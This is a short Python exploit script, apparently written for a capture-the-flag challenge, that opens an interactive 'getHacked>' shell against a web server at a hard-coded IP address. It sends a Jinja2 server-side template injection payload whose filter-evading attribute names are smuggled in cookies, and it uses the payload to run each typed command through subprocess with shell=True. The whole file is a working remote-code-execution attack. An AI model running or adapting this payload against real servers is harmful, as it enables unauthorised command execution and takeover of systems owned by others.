from requests import get

target_url = "http://34.89.183.202:31984/"

while True:
    cmd = input("getHacked> ")
    params = {
        "content": "{{request[request.cookies['a']][request.cookies['b']][request.cookies['c']][request.cookies['d']][request.cookies['e']][request.cookies['f']]('subprocess')[request.cookies['g']](request.cookies['h'],shell=True)}}"
    }
    
    cookies = {
        "a": "__class__",
        "b": "__init__",
        "c": "im_func",
        "d": "func_globals",
        "e": "__builtins__",
        "f": "__import__",
        "g": "check_output", 
        "h": cmd
    }

    try:
        req = get(target_url, params=params, cookies=cookies)
        print(req.text)
    except Exception as e:
        print("Eroare la conectare")

print("off")
